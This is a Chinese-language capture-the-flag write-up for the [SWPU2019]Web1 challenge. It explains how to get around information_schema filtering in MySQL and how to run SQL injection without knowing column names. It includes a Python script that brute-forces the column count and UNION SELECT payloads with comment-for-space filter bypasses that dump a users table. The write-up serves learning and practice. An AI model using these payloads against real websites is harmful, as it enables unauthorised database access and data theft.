# \[SWPU2019]Web1

## \[SWPU2019]Web1

## 考点

* bypass information\_schema
* 无列名注入

## 题解

### bypass information\_schema

information\_schema 在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。

在注入中，infromation\_schema 库的作用无非就是可以获取到 table\_schema,table\_name,column\_name这些数据库内的信息。

mysql在5.7版本中新增了sys schemma，基础数据来自于performance\_chema和information\_schema两个库，本身数据库不存储数据

注：innoDB引擎也可以绕过对information\_schema的过滤，但是mysql默认是关闭InnoDB存储引擎的

如果在设计表时，给每个表加一个自增的id字段，那么就可以使用这种方法

首先，<mark style="background-color:orange;">schema\_auto\_increment\_columns</mark>，该视图的作用简单来说就是用来对表自增ID的监控。那么我们可以通过该视图获取数据库的表名信息

<mark style="background-color:orange;">如何获取没有自增主键的表的数据，这就要用到schema\_table\_statistics\_with\_buffer和x$schema\_table\_statistics\_with\_buffer</mark>

限制：\
mysql ≥ 5.7版本\
要超级管理员才可以访问sys

```
select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database();

select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()；
```

### 使用innoDB引擎绕过information\_schema

* 表引擎为 innoDB
* MySQL > 5.5
* innodb\_table\_stats、innodb\_index\_stats存放所有库名表名
* select table\_name from mysql.innodb\_table\_stats where database\_name=库名;

### 第三种姿势

* 爆库名 select 1,2,3 from users where 1=abc();
* 爆表名 select 1,2,3 from users where Polygon(id);
* 爆表名 select 1,2,3 from users where linestring(id);
* 爆字段名 select 1,2,3 from users where (select \* from (select \* from users as a join users as b)as c);
* 爆字段名 select 1,2,3 from users where (select \* from (select \* from users as a join users as b using(id))as c);

### 无列名注入

用数字表示对应的列

```
SELECT `2` FROM (SELECT 1,2,3 UNION SELECT * FROM users)a;
```

当反引号不能使用时，就可以使用别名

```
SELECT b FROM (SELECT 1,2 as b,3 UNION SELECT * FROM users)a;
SELECT c FROM (SELECT 1,2,3 c UNION SELECT * FROM users)a;
```

利用 join 报错来获取列名，分别获取第一个列和第三个列

```
select * from (select * from users as a join users b)c;
select * from (select * from users as a join users b using(id,username))c;
```

## wp

上面说的三种姿势都不行。

首先，发现过滤了or，空格，information\_schema，#

POST数据，提示为 The used SELECT statements have a different number of columns

```
title=a'/**/union/**/select/**/1,2,3,4'&content=aaaaaaa&ac=add
```

写个脚本爆破一下有多少列，结果为22列，显示位在2，3位

```python
import requests

url_login = 'http://ec4c1a73-6f76-4f8c-997e-cb4a046191b3.node3.buuoj.cn/login.php'
url_add = 'http://ec4c1a73-6f76-4f8c-997e-cb4a046191b3.node3.buuoj.cn/addads.php'
url_detail = 'http://ec4c1a73-6f76-4f8c-997e-cb4a046191b3.node3.buuoj.cn/detail.php?id='

#payload = "a'/**/union/**/select/**/1"
#payload = "a'/**/union/**/select/**/1,2,3,4,5,6,7,8,9"
payload = "a'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19"

s = requests.Session()

login_data = {
    'username': 'testtest',
    'password': 'test',
    'ac': 'login'
}

s.post(url=url_login, data=login_data)

#for i in range(1, 10):
#for i in range(10, 20):
for i in range(20, 30):
    payload = payload + ',' + str(i)
    
    payload_data = {
        'title': payload + "'",
        'content': '123',
        'ac': 'add'
    }
    
    s.post(url=url_add, data=payload_data)
    
for i in range(2,90):
    r = s.get(url=url_detail+str(i))
    if 'The used SELECT' in r.text :
        print(i)
```

语句为

```
a'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```

这里进行无列名注入，查询users表进行无列名注入，查询第一列语句如下

```
select group_concat(a) from (select 1 as a,2 as b,3 as c union select * from users)x
```

在本题最终bypass语句如下

```
a'/**/union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```
